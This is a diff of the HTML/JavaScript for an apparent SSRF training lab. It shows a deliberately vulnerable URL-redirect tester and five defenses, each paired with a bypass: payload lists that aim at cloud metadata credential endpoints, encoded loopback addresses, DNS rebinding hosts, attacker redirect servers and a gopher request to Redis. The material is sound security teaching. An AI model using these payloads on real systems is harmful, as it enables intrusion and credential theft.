@@ -1,631 +1,678 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SSRF Bypass Lab – 2025 Edition</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
-    <link rel="stylesheet" href="https://unpkg.com/dracula-prism/dist/css/dracula-prism.min.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
-    <style>
-        .terminal {
-            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
-        }
-        .pulse-green {
-            animation: pulse-green 2s infinite;
-        }
-        @keyframes pulse-green {
-            0%, 100% { box-shadow: 0 0 5px #10b981; }
-            50% { box-shadow: 0 0 20px #10b981, 0 0 30px #10b981; }
-        }
-        .active-tab {
-            background: linear-gradient(135deg, #ec4899 0%, #8b5cf6 100%);
-        }
-    </style>
-</head>
-<body class="bg-gray-950 text-white font-inter min-h-screen">
-    <div class="grid grid-cols-12 gap-0 min-h-screen">
-        <!-- Sidebar Navigation -->
-        <aside class="col-span-3 bg-gray-900 p-4 space-y-4 sticky top-0 h-screen overflow-y-auto">
-            <h1 class="text-xl font-bold text-pink-500">SSRF Lab</h1>
-            
-            <!-- About Section -->
-            <div class="bg-gray-800 rounded-lg p-3 text-sm">
-                <button onclick="toggleAbout()" class="w-full text-left font-semibold text-blue-300 hover:text-blue-200 flex items-center justify-between">
-                    ℹ️ About
-                    <span id="about-arrow" class="transform transition-transform">▼</span>
-                </button>
-                <div id="about-content" class="hidden mt-2 text-gray-300 text-xs leading-relaxed">
-                    <p class="mb-2"><strong>RedirectTrace</strong> is a URL redirection testing tool designed to help developers and security researchers analyze redirect chains.</p>
-                    <p class="mb-2"><strong>Original Purpose:</strong></p>
-                    <ul class="list-disc list-inside mb-2 space-y-1">
-                        <li>Test URL redirections</li>
-                        <li>Trace redirect chains</li>
-                        <li>Analyze final destinations</li>
-                        <li>Debug redirect loops</li>
-                    </ul>
-                    <p class="text-red-300"><strong>Security Issue:</strong> The tool contains SSRF vulnerabilities that allow attackers to access internal services.</p>
-                </div>
-            </div>
-
-            <nav class="space-y-2">
-                <button class="tab-btn active-tab block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="nodefense">🔓 No Defense</button>
-                <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense1">🛡️ IP Blacklisting</button>
-                <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense2">🛡️ DNS Pinning Defense</button>
-                <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense3">🛡️ Redirect Mitigation</button>
-                <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense4">🛡️ TOCTOU Race Protection</button>
-                <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense5">🛡️ Comprehensive Controls</button>
-            </nav>
-        </aside>
-
-        <!-- Main Content -->
-        <main class="col-span-9 p-6 space-y-6">
-            <!-- URL Input -->
-            <div>
-                <label for="url" class="text-lg font-semibold block mb-2">RedirectTrace - URL Redirection Tester</label>
-                <div class="flex gap-4">
-                    <input id="url" type="text" class="flex-1 px-4 py-2 rounded bg-gray-800 text-white border border-gray-700 focus:border-pink-500 focus:ring-2 focus:ring-pink-500/20 outline-none" placeholder="http://example.com/redirect" />
-                    <button 
-                        id="test-btn" 
-                        onclick="testCurrentEndpoint()" 
-                        class="px-6 py-2 bg-pink-600 hover:bg-pink-500 rounded font-medium transition-colors"
-                    >
-                        <span id="btn-text">🚀 Test</span>
-                        <div id="spinner" class="hidden animate-spin inline-block w-4 h-4 border-2 border-white/30 border-t-white rounded-full ml-2"></div>
-                    </button>
-                </div>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>SSRF Bypass Lab – 2025 Edition</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+        <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+        <link rel="stylesheet" href="https://unpkg.com/dracula-prism/dist/css/dracula-prism.min.css">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+        <style>
+            .terminal {
+                background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+                box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
+            }
+            .pulse-green {
+                animation: pulse-green 2s infinite;
+            }
+            @keyframes pulse-green {
+                0%, 100% { box-shadow: 0 0 5px #10b981; }
+                50% { box-shadow: 0 0 20px #10b981, 0 0 30px #10b981; }
+            }
+            .active-tab {
+                background: linear-gradient(135deg, #ec4899 0%, #8b5cf6 100%);
+            }
+        </style>
+    </head>
+    <body class="bg-gray-950 text-white font-inter min-h-screen">
+        <div class="grid grid-cols-12 gap-0 min-h-screen">
+            <!-- Sidebar Navigation -->
+            <aside class="col-span-3 bg-gray-900 p-4 space-y-4 sticky top-0 h-screen overflow-y-auto">
+                <h1 class="text-xl font-bold text-pink-500">SSRF Lab</h1>
                 
-                <!-- Normal Functionality Examples -->
-                <div class="mt-2 text-sm text-gray-400">
-                    <span class="mr-4">Try normal functionality:</span>
-                    <button onclick="setExampleUrl('http://httpbin.org/redirect/3')" class="text-blue-400 hover:text-blue-300 mr-3 underline">Redirect Chain</button>
-                    <button onclick="setExampleUrl('http://httpbin.org/status/301')" class="text-blue-400 hover:text-blue-300 mr-3 underline">301 Redirect</button>
-                    <button onclick="setExampleUrl('http://httpbin.org/json')" class="text-blue-400 hover:text-blue-300 mr-3 underline">JSON Response</button>
-                    <button onclick="setExampleUrl('http://httpbin.org/headers')" class="text-blue-400 hover:text-blue-300 underline">Headers Info</button>
-                </div>
-            </div>
-
-            <!-- Terminal Output -->
-            <div class="terminal rounded-lg border border-gray-700 overflow-hidden">
-                <div class="bg-gray-800 px-4 py-2 border-b border-gray-700 flex items-center">
-                    <div class="flex space-x-2 mr-4">
-                        <div class="w-3 h-3 bg-red-500 rounded-full"></div>
-                        <div class="w-3 h-3 bg-yellow-500 rounded-full"></div>
-                        <div class="w-3 h-3 bg-green-500 rounded-full"></div>
-                    </div>
-                    <span class="text-sm text-gray-300">Terminal</span>
-                </div>
-                <div class="p-4">
-                    <div id="status" class="mb-4 text-lg font-medium"></div>
-                    <pre id="output" class="hidden bg-black text-green-400 font-mono text-sm p-4 rounded-lg overflow-auto whitespace-pre-wrap max-h-96 border border-green-500"><code id="code"></code></pre>
-                    <div id="initial-message" class="text-gray-400 text-center py-8">
-                        <div class="text-4xl mb-4">🔗</div>
-                        <p>Enter a URL above to trace its redirection chain</p>
-                        <p class="text-sm mt-2">This tool helps analyze where URLs redirect to</p>
+                <!-- About Section -->
+                <div class="bg-gray-800 rounded-lg p-3 text-sm">
+                    <button onclick="toggleAbout()" class="w-full text-left font-semibold text-blue-300 hover:text-blue-200 flex items-center justify-between">
+                        ℹ️ About
+                        <span id="about-arrow" class="transform transition-transform">▼</span>
+                    </button>
+                    <div id="about-content" class="hidden mt-2 text-gray-300 text-xs leading-relaxed">
+                        <p class="mb-2"><strong>RedirectTrace</strong> is a URL redirection testing tool designed to help developers and security researchers analyze redirect chains.</p>
+                        <p class="mb-2"><strong>Original Purpose:</strong></p>
+                        <ul class="list-disc list-inside mb-2 space-y-1">
+                            <li>Test URL redirections</li>
+                            <li>Trace redirect chains</li>
+                            <li>Analyze final destinations</li>
+                            <li>Debug redirect loops</li>
+                        </ul>
+                        <p class="text-red-300"><strong>Security Issue:</strong> The tool contains SSRF vulnerabilities that allow attackers to access internal services.</p>
                     </div>
                 </div>
-            </div>
 
-            <!-- Dynamic Tab Content -->
-            <div id="defense-analysis">
-                <div class="bg-gray-800/30 rounded-xl border border-gray-700 overflow-hidden">
-                    <button onclick="toggleDefenseAnalysis()" class="w-full px-6 py-4 bg-gradient-to-r from-gray-800 to-gray-700 hover:from-gray-700 hover:to-gray-600 transition-all flex items-center justify-between text-left">
-                        <div>
-                            <h3 class="text-lg font-semibold text-white">🔍 Bypassing the Implemented Defence</h3>
-                            <p class="text-gray-400 text-sm">Analyze vulnerabilities and attack vectors</p>
+                <nav class="space-y-2">
+                    <button class="tab-btn active-tab block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="nodefense">🔓 No Defense</button>
+                    <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense1">🛡️ Defense: IP Blacklisting</button>
+                    <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense2">🛡️ Defense: Library Filter</button>
+                    <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense3">🛡️ Defense: DNS Resolution</button>
+                    <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense4">🛡️ Defense: Disabling Redirection</button>
+                    <button class="tab-btn block w-full text-left px-4 py-2 rounded hover:bg-gray-800 transition" data-tab="defense5">🛡️ Defense: Comprehensive Controls</button>
+                </nav>
+            </aside>
+
+            <!-- Main Content -->
+            <main class="col-span-9 p-6 space-y-6">
+                <!-- URL Input -->
+                <div>
+                    <label for="url" class="text-lg font-semibold block mb-2">RedirectTrace - URL Redirection Tester</label>
+                    <div class="flex gap-4">
+                        <input id="url" type="text" class="flex-1 px-4 py-2 rounded bg-gray-800 text-white border border-gray-700 focus:border-pink-500 focus:ring-2 focus:ring-pink-500/20 outline-none" placeholder="http://example.com/redirect" />
+                        <button 
+                            id="test-btn" 
+                            onclick="testCurrentEndpoint()" 
+                            class="px-6 py-2 bg-pink-600 hover:bg-pink-500 rounded font-medium transition-colors"
+                        >
+                            <span id="btn-text">🚀 Test</span>
+                            <div id="spinner" class="hidden animate-spin inline-block w-4 h-4 border-2 border-white/30 border-t-white rounded-full ml-2"></div>
+                        </button>
+                    </div>
+                    
+                    <!-- Normal Functionality Examples -->
+                    <div class="mt-2 text-sm text-gray-400">
+                        <span class="mr-4">Try normal functionality:</span>
+                        <button onclick="setExampleUrl('http://httpbin.org/redirect/3')" class="text-blue-400 hover:text-blue-300 mr-3 underline">Redirect Chain</button>
+                        <button onclick="setExampleUrl('http://httpbin.org/status/301')" class="text-blue-400 hover:text-blue-300 mr-3 underline">301 Redirect</button>
+                        <button onclick="setExampleUrl('http://httpbin.org/json')" class="text-blue-400 hover:text-blue-300 mr-3 underline">JSON Response</button>
+                        <button onclick="setExampleUrl('http://httpbin.org/headers')" class="text-blue-400 hover:text-blue-300 underline">Headers Info</button>
+                    </div>
+                </div>
+
+                <!-- Terminal Output -->
+                <div class="terminal rounded-lg border border-gray-700 overflow-hidden">
+                    <div class="bg-gray-800 px-4 py-2 border-b border-gray-700 flex items-center">
+                        <div class="flex space-x-2 mr-4">
+                            <div class="w-3 h-3 bg-red-500 rounded-full"></div>
+                            <div class="w-3 h-3 bg-yellow-500 rounded-full"></div>
+                            <div class="w-3 h-3 bg-green-500 rounded-full"></div>
                         </div>
-                        <span id="defense-arrow" class="text-xl transform transition-transform">▼</span>
-                    </button>
-                    <div id="defense-content" class="hidden">
-                        <div id="tab-content" class="p-6 space-y-6"></div>
+                        <span class="text-sm text-gray-300">Terminal</span>
+                    </div>
+                    <div class="p-4">
+                        <div id="status" class="mb-4 text-lg font-medium"></div>
+                        <pre id="output" class="hidden bg-black text-green-400 font-mono text-sm p-4 rounded-lg overflow-auto whitespace-pre-wrap max-h-96 border border-green-500"><code id="code"></code></pre>
+                        <div id="initial-message" class="text-gray-400 text-center py-8">
+                            <div class="text-4xl mb-4">🔗</div>
+                            <p>Enter a URL above to trace its redirection chain</p>
+                            <p class="text-sm mt-2">This tool helps analyze where URLs redirect to</p>
+                        </div>
                     </div>
                 </div>
-            </div>
-            <!-- <div id="tab-content" class="space-y-6"></div> -->
-        </main>
-    </div>
 
-    <script>
-        var currentTab = 'nodefense';
+                <!-- Dynamic Tab Content -->
+                <div id="defense-analysis">
+                    <div class="bg-gray-800/30 rounded-xl border border-gray-700 overflow-hidden">
+                        <button onclick="toggleDefenseAnalysis()" class="w-full px-6 py-4 bg-gradient-to-r from-gray-800 to-gray-700 hover:from-gray-700 hover:to-gray-600 transition-all flex items-center justify-between text-left">
+                            <div>
+                                <h3 class="text-lg font-semibold text-white">🔍 Bypassing the Implemented Defence</h3>
+                                <p class="text-gray-400 text-sm">Analyze vulnerabilities and attack vectors</p>
+                            </div>
+                            <span id="defense-arrow" class="text-xl transform transition-transform">▼</span>
+                        </button>
+                        <div id="defense-content" class="hidden">
+                            <div id="tab-content" class="p-6 space-y-6"></div>
+                        </div>
+                    </div>
+                </div>
+                <!-- <div id="tab-content" class="space-y-6"></div> -->
+            </main>
+        </div>
 
-        var tabDetails = {
-            nodefense: {
-                title: "No URL Sanitization",
-                description: "RedirectTrace was built as a legitimate tool to help developers analyze URL redirections and trace redirect chains. However, it contains a critical SSRF vulnerability because it makes HTTP requests to any user-provided URL without proper validation.",
-                code: "const url = req.query.url;\n\nif (!check_proto.test(url)) {\n    return res.status(401).send('Invalid URL Format. Please specify Protocol (HTTP OR HTTPS)');\n}\n\n// make a request to user provided url\nconst response = await axios.get(url);\n\nreturn res.send(response.data);",
-                vulnerability: "Since there is no validation on server side, attacker can simply pass loopback or private address as URL parameter and get sensitive information",
-                defenseTechnique: "No Protection",
-                attackTechnique: "Direct Access",
-                payloads: [
-                    "http://169.254.169.254/latest/meta-data/",
-                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-                    "http://127.0.0.1:3000/ssh_key", 
-                    "http://0.0.0.0:3000/"
-                ]
-            },
-            defense1: {
-                title: "Defense 1: IP Blacklisting vs. Encoding Bypass",
-                description: "The simplest solution used by developer to defend against SSRF attacks is evaluating an hostname/IP address against a blacklist. In this method, host-part of the user provided URL is matched against a backlist to ensure that it does not point to an internal service. If a match is found, the request is rejected by the protection mechanism.",
-                code: "const url = req.query.url,\n    host = getLocation(url),\n    hostname = host.hostname;\n\nif (!check_proto.test(url)) {\n    return res.status(401).send('Invalid URL Format. Please specify Protocol (HTTP OR HTTPS)');\n}\n\n// Match the host part against the list of blacklist IP address.\nconst blackListIps = ['127.', '0.', '192.168', '10.', '169.254', '172.'],\n    isBlacklisted = blackListIps.some((pattern) => { return hostname.startsWith(pattern); });\n\n// make http request only if match pass\nif (isBlacklisted) {\n    return res.status(423).send('Action Blocked! You are trying to access restricted IP address');\n}\n\n// make a request to user provided url\nconst response = await axios.get(url);\n\nreturn res.send(response.data);",
-                vulnerability: "The defense solution is bypassed by using different encoding schemes. (e.g., decimal-encoded version of 127.0.0.1 is 2130706433) and IPv6.",
-                bypassTitle: "Bypass: Incomplete Blacklisting",
-                defenseTechnique: "IP Address Blacklisting",
-                attackTechnique: "IP Encoding Bypass",
-                encodingTable: {
-                    "Decimal encoding (127.0.0.1)": "2130706433",
-                    "Decimal encoding (169.254.169.254)": "2852039166", 
-                    "Hex Encoding (127.0.0.1)": "0x7f.0x0.0x0.0x1",
-                    "Octal Encoding (127.0.0.1)": "0177.0.0.01",
-                    "Mixed Encoding (127.0.0.1)": "0177.0.0.0x1",
-                    "Binary Encoding (127.0.0.1)": "10101001111111101010100111111110"
+        <script>
+            var currentTab = 'nodefense';
+
+            var tabDetails = {
+                nodefense: {
+                    title: "No URL Sanitization",
+                    description: "RedirectTrace was built as a legitimate tool to help developers analyze URL redirections and trace redirect chains. However, it contains a critical SSRF vulnerability because it makes HTTP requests to any user-provided URL without proper validation.",
+                    code: "const url = req.query.url;\n\nif (!check_proto.test(url)) {\n    return res.status(401).send('Invalid URL Format. Please specify Protocol (HTTP OR HTTPS)');\n}\n\n// make a request to user provided url\nconst response = await axios.get(url);\n\nreturn res.send(response.data);",
+                    vulnerability: "Since there is no validation on server side, attacker can simply pass loopback or private address as URL parameter and get sensitive information",
+                    defenseTechnique: "No Protection",
+                    attackTechnique: "Direct Access",
+                    payloads: [
+                        "http://169.254.169.254/latest/meta-data/",
+                        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                        "http://127.0.0.1:3000/ssh_key", 
+                        "http://0.0.0.0:3000/"
+                    ]
                 },
-                payloads: [
-                    "http://2130706433:3000/ssh_key",
-                    "http://2852039166/latest/meta-data/", 
-                    "http://0x7f.0x0.0x0.0x1:3000/",
-                    "http://0177.0.0.01:3000/"
-                ]
-            },
-            defense2: {
-                title: "Defense 2: Input Validation vs. DNS Pinning",
-                description: "To avoid the limitations of blacklisting, some developers rely on libraries to disallow a URL which has a private IP address as its host component. However, this solution is not resilient against DNS pinning.",
-                code: "const url = req.query.url,\n    hostname = getHostname(url);\n\nif (!check_proto.test(url)) {\n    return res.status(401).send('Invalid URL Format. Please specify Protocol (HTTP OR HTTPS)');\n}\n\n// check if IP address is valid\nif (ipaddr.isValid(hostname) && isPrivateIP(hostname)) {\n    return res.status(423).send('Action Blocked! You are trying to access restricted IP address');\n}\n\n// Check if domain name is valid\nif (!isValidDomain(hostname)) {\n    return res.status(400).send('Invalid domain name! Please use a valid domain name');\n}\n\n// make a request to user provided url\nconst response = await axios.get(url);\n\nreturn res.send(response.data);",
-                vulnerability: "An attacker can use a hostname that resolves to a private IP to bypass the defense. It can be used by an attacker to bind a legit domain name to an internal IP address.",
-                bypassTitle: "Bypass: DNS Pinning Technique",
-                defenseTechnique: "Private IP Validation",
-                attackTechnique: "DNS Pinning Attack",
-                bypassSteps: [
-                    "Attacker passes a domain like http://test1.pstmn-stage.io as URL parameter",
-                    "The hostname of this URL doesn't match with private IP blacklist. This will bypass all the defence",
-                    "Now axios library will internally resolved the IP address from hostname. DNS will be resolved to internal/private IP address",
-                    "Axios will return internal resource back to the user"
-                ],
-                payloads: [
-                    "http://test1.pstmn-stage.io/",
-                    "http://127.0.0.1.nip.io:3000/ssh_key",
-                    "http://localtest.me:3000/",
-                    "http://vcap.me:3000/"
-                ]
-            },
-            defense3: {
-                title: "Defense 3: DNS Filtering vs. HTTP Redirection", 
-                description: "Now, in order to mitigate DNS pinning issue, developers can check if the host component of a URL resolves to a private IP address by making a DNS query. However, this mitigation can be defeated by using HTTP Redirection Bypass Technique.",
-                code: "const url = req.query.url,\n    hostname = getHostname(url);\n\nif (!check_proto.test(url)) {\n    return res.status(401).send('Invalid URL Format. Please specify Protocol (HTTP OR HTTPS)');\n}\n\n// check if IP address is valid\nif (ipaddr.isValid(hostname) && isPrivateIP(hostname)) {\n    return res.status(423).send('Action Blocked! You are trying to access restricted IP address');\n}\n\n// Check if domain name is valid\nif (!isValidDomain(hostname)) {\n    return res.status(400).send('Invalid domain name! Please use a valid domain name');\n}\n\ntry {\n    const address = await lookupPromise(hostname);\n\n    if (isPrivateIP(address)) {\n        return res.status(423).send('Action Blocked! Your domain name got resolved to ' + address);\n    }\n}\ncatch (err) {\n    if (err.code === 'ENOTFOUND') {\n        return res.send('invalidCustomDomainError: Couldn\\'t resolve domain name.');\n    }\n    throw err;\n}\n\n// make a request to user provided url\nconst response = await axios.get(url);\n\nreturn res.send(response.data);",
-                vulnerability: "An attacker inputs a URL pointing to a page on a server controlled by an attacker. As this server has a public IP address, the check passes, and the page is visited. This page, in turn, redirects the vulnerable server to make a request to an internal service.",
-                bypassTitle: "Bypass: HTTP Redirection Technique",
-                defenseTechnique: "DNS Resolution Filtering", 
-                attackTechnique: "HTTP Redirection Bypass",
-                defenseTechnique: "Redirect Prevention",
-                attackTechnique: "TOCTOU Race Condition",
-                bypassSteps: [
-                    "In this technique, attacker provides a URL as a parameter that points to a server controlled by the attacker. Since this server has public IP, it pass both the checks, i.e. DNS resolution check and then IP blacklist checks",
-                    "At this point, all the security checks has been circumvented. So now HTTP request library will fetch resources using User provided URL",
-                    "Attacker controlled server is serving a script that redirects users to a domain name pointing to victim's internal IP address",
-                    "HTTP request library will fetch the resource from internal service and give it away to the attacker"
-                ],
-                payloads: [
-                    "http://evil-server.com/redirect-to-localhost",
-                    "http://attacker.com/ssrf-redirect.php",
-                    "http://malicious-redirect.example.com/",
-                    "http://redirect-service.herokuapp.com/127.0.0.1:3000"
-                ]
-            },
-            defense4: {
-                title: "Defence 4: Redirect Prevention vs. TOCTOU Attack",
-                description: "To prevent HTTP redirection bypass, developers disable redirection in requests made from the application to the Internet. However, disabling redirection while fetching resources would render moved resources to be unreachable. Given the fact that resources are often moved either temporarily or permanently on the Internet, tension might arise between security and functionality.",
-                code: "const url = req.query.url,\n    hostname = getHostname(url);\n\nif (!check_proto.test(url)) {\n    return res.status(401).send('Invalid URL Format. Please specify Protocol (HTTP OR HTTPS)');\n}\n\n// check if IP address is valid\nif (ipaddr.isValid(hostname) && isPrivateIP(hostname)) {\n    return res.status(423).send('Action Blocked! You are trying to access restricted IP address');\n}\n\n// Check if domain name is valid\nif (!isValidDomain(hostname)) {\n    return res.status(400).send('Invalid domain name! Please use a valid domain name');\n}\n\ntry {\n    const address = await lookupPromise(hostname);\n    console.log('resolved address => ', address);\n\n    if (isPrivateIP(address)) {\n        return res.status(423).send('Action Blocked! Your domain name got resolved to ' + address);\n    }\n}\ncatch (err) {\n    if (err.code === 'ENOTFOUND') {\n        return res.send('invalidCustomDomainError: Couldn\\'t resolve domain name.');\n    }\n    throw err;\n}\n\ntry {\n    // make a request to user provided url\n    const response = await axios.get(url, { maxRedirects: 0 });\n    console.log('response  => ', response);\n\n    return res.send(response.data);\n}\ncatch (e) {\n    return res.status(423).send('Action Blocked! We have blocked the redirection to protect our application against SSRF vulnerability');\n}",
-                vulnerability: "Two DNS requests are made before an HTTP request is made to a target URL: Request 1: to check whether the host is pointing to a private IP address, Request 2: resolve the hostname to start a connection to the target server. Attackers take advantage of this by providing a URL pointing to their own server and have their DNS server serve two different DNS responses.",
-                bypassTitle: "Bypass: Time of Check to Time of Use (TOCTOU) Race Condition",
-                defenseTechnique: "Redirect Prevention",
-                attackTechnique: "TOCTOU Race Condition",
-                toctouSteps: [
-                    "First Response: a public IP address to pass the first check",
-                    "Second Response: A private IP address to achieve a request forgery to an internal service"
-                ],
-                bypassNote: "In short, if an attacker can change the DNS resolution result after time to check and before time of use, he can bypass the validator. DNS rebinding technique is used to targets TOCTOU type of vulnerabilities.",
-                payloads: [
-                    "http://dns-rebind.example.com/",
-                    "http://toctou-attack.malicious.com/",
-                    "http://race-condition.exploit.net/",
-                    "http://rebind.network:3000/"
-                ]
-            },
-            defense5: {
-                title: "Defense 5: Comprehensive Defense vs. Protocol Smuggling",
-                description: "A comprehensive solution that combines multiple techniques: strict input validation, DNS resolution caching, network-level controls, and request monitoring to prevent SSRF attacks effectively.",
-                code: "// Comprehensive SSRF protection\nconst url = req.query.url;\nconst hostname = getHostname(url);\n\n// 1. Protocol validation\nif (!check_proto.test(url)) {\n    return res.status(401).send('Invalid URL Format');\n}\n\n// 2. Strict hostname validation\nif (!isValidPublicDomain(hostname)) {\n    return res.status(423).send('Only public domains allowed');\n}\n\n// 3. DNS resolution with caching and validation\nconst resolvedIP = await secureResolve(hostname);\nif (isPrivateIP(resolvedIP)) {\n    return res.status(423).send('Private IP access denied');\n}\n\n// 4. Network-level restrictions\nconst response = await secureRequest(url, {\n    maxRedirects: 0,\n    timeout: 5000,\n    allowedPorts: [80, 443],\n    networkPolicy: 'public-only'\n});\n\nreturn res.send(response.data);",
-                vulnerability: "This defense implements multiple layers of protection, but may still be vulnerable to sophisticated attacks involving zero-day bypasses, protocol smuggling, or advanced DNS manipulation techniques.",
-                bypassTitle: "Advanced Attack Vectors",
-                defenseTechnique: "Multi-Layer Protection",
-                attackTechnique: "Protocol Smuggling",
-                advancedTechniques: [
-                    "Protocol smuggling and HTTP request splitting",
-                    "IPv6 bypass techniques and dual-stack exploitation", 
-                    "Cloud metadata service enumeration",
-                    "Internal service discovery via timing attacks",
-                    "WebSocket upgrade attacks and protocol switching"
-                ],
-                payloads: [
-                    "http://[::1]:3000/ssh_key",
-                    "http://metadata.google.internal/",
-                    "http://169.254.170.2/v2/metadata/",
-                    "gopher://127.0.0.1:6379/_INFO"
-                ]
-            }
-        };
-
-        function updateDefenseButton(details) {
-            var button = document.querySelector('#defense-analysis button');
-            if (button && details.defenseTechnique && details.attackTechnique) {
-                button.innerHTML = '<div>' +
-                    '<h3 class="text-lg font-semibold text-white">🔍 Security Analysis</h3>' +
-                    '<p class="text-gray-400 text-sm">Defensive Technique: <span class="bg-green-500/20 text-green-300 px-2 py-1 rounded font-medium">' + details.defenseTechnique + '</span> vs Attacker Technique: <span class="bg-red-500/20 text-red-300 px-2 py-1 rounded font-medium">' + details.attackTechnique + '</span></p>' +
-                    '</div>' +
-                    '<span id="defense-arrow" class="text-xl transform transition-transform">▼</span>';
-            }
-        }
-
-
-        function getPayloadDescription(payload) {
-            var descriptions = {
-                // No Defense payloads
-                "http://169.254.169.254/latest/meta-data/": "AWS EC2 metadata service - contains sensitive instance information",
-                "http://169.254.169.254/latest/meta-data/iam/security-credentials/": "AWS IAM security credentials - highly sensitive",
-                "http://127.0.0.1:3000/ssh_key": "Local SSH key endpoint - accessing internal application routes", 
-                "http://0.0.0.0:3000/": "Alternative localhost representation",
-                "http://localhost:22": "Local SSH service - port scanning internal services",
-                
-                // Defense 1 payloads (encoding bypasses)
-                "http://2130706433:3000/ssh_key": "Decimal encoding of 127.0.0.1 - bypasses string pattern matching",
-                "http://2852039166/latest/meta-data/": "Decimal encoding of 169.254.169.254 - AWS metadata access",
-                "http://0x7f.0x0.0x0.0x1:3000/": "Hexadecimal IP encoding - represents 127.0.0.1",
-                "http://0177.0.0.01:3000/": "Octal IP encoding - represents 127.0.0.1",
-                
-                // Defense 2 payloads (DNS pinning)
-                "http://test1.pstmn-stage.io/": "Domain that resolves to private IP - DNS pinning attack",
-                "http://127.0.0.1.nip.io:3000/ssh_key": "Wildcard DNS service pointing to 127.0.0.1",
-                "http://localtest.me:3000/": "Public domain that resolves to 127.0.0.1",
-                "http://vcap.me:3000/": "Another DNS service for localhost resolution",
-                
-                // Defense 3 payloads (HTTP redirection)
-                "http://evil-server.com/redirect-to-localhost": "Attacker-controlled server that redirects to internal services",
-                "http://attacker.com/ssrf-redirect.php": "Malicious redirect script targeting internal endpoints",
-                "http://malicious-redirect.example.com/": "Server hosting redirect payloads for SSRF",
-                "http://redirect-service.herokuapp.com/127.0.0.1:3000": "Public redirect service targeting localhost",
-                
-                // Defense 4 payloads (TOCTOU/DNS rebinding)
-                "http://dns-rebind.example.com/": "DNS rebinding attack - serves different IPs on consecutive requests",
-                "http://toctou-attack.malicious.com/": "Time-of-check-time-of-use race condition exploit",
-                "http://race-condition.exploit.net/": "Exploits timing between DNS resolution and HTTP request",
-                "http://rebind.network:3000/": "DNS rebinding service for SSRF exploitation",
-                
-                // Defense 5 payloads (advanced techniques)
-                "http://[::1]:3000/ssh_key": "IPv6 localhost bypass - targets internal services via IPv6",
-                "http://metadata.google.internal/": "Google Cloud metadata service access",
-                "http://169.254.170.2/v2/metadata/": "Alternative cloud metadata endpoint",
-                "gopher://127.0.0.1:6379/_INFO": "Gopher protocol for Redis internal service access"
-            };
-            return descriptions[payload] || "Test payload for SSRF exploitation";
-        }
-
-        function stripHtmlTags(html) {
-            var tmp = document.createElement('div');
-            tmp.innerHTML = html;
-            return tmp.textContent || tmp.innerText || '';
-        }
-
-        function toggleDefenseAnalysis() {
-            var content = document.getElementById('defense-content');
-            var arrow = document.getElementById('defense-arrow');
-            
-            if (content.classList.contains('hidden')) {
-                content.classList.remove('hidden');
-                arrow.style.transform = 'rotate(180deg)';
-                renderTab(currentTab);
-            } else {
-                content.classList.add('hidden');
-                arrow.style.transform = 'rotate(0deg)';
-            }
-        }
-
-        function formatJsonOutput(text) {
-            try {
-                var jsonObj = JSON.parse(text);
-                return JSON.stringify(jsonObj, null, 2);
-            } catch (e) {
-                return text;
-            }
-        }
-
-        function copyPayload(payload) {
-            if (navigator.clipboard) {
-                navigator.clipboard.writeText(payload);
-            }
-        }
-
-        function toggleAbout() {
-            var aboutContent = document.getElementById('about-content');
-            var arrow = document.getElementById('about-arrow');
-            
-            if (aboutContent.classList.contains('hidden')) {
-                aboutContent.classList.remove('hidden');
-                arrow.style.transform = 'rotate(180deg)';
-            } else {
-                aboutContent.classList.add('hidden');
-                arrow.style.transform = 'rotate(0deg)';
-            }
-        }
-
-        function setExampleUrl(url) {
-            document.getElementById('url').value = url;
-        }
-
-        function togglePayloads(tab) {
-            var payloadsDiv = document.getElementById('payloads-' + tab);
-            var arrow = document.getElementById('payload-arrow-' + tab);
-            
-            if (payloadsDiv.classList.contains('hidden')) {
-                payloadsDiv.classList.remove('hidden');
-                arrow.style.transform = 'rotate(180deg)';
-            } else {
-                payloadsDiv.classList.add('hidden');
-                arrow.style.transform = 'rotate(0deg)';
-            }
-        }
-
-        function testPayload(tab, index) {
-            var payloadInput = document.getElementById('payload-' + tab + '-' + index);
-            var payload = payloadInput.value.trim();
-            if (!payload) return;
-            
-            document.getElementById('url').value = payload;
-            testCurrentEndpoint();
-        }
-
-        function renderTab(tab) {
-            var details = tabDetails[tab];
-            if (!details) return;
-
-            var wrapper = document.getElementById("tab-content");
-            
-            var html = '<div class="rounded-xl p-6 bg-teal-900/40 text-teal-50 shadow-lg border border-teal-700/50">' +
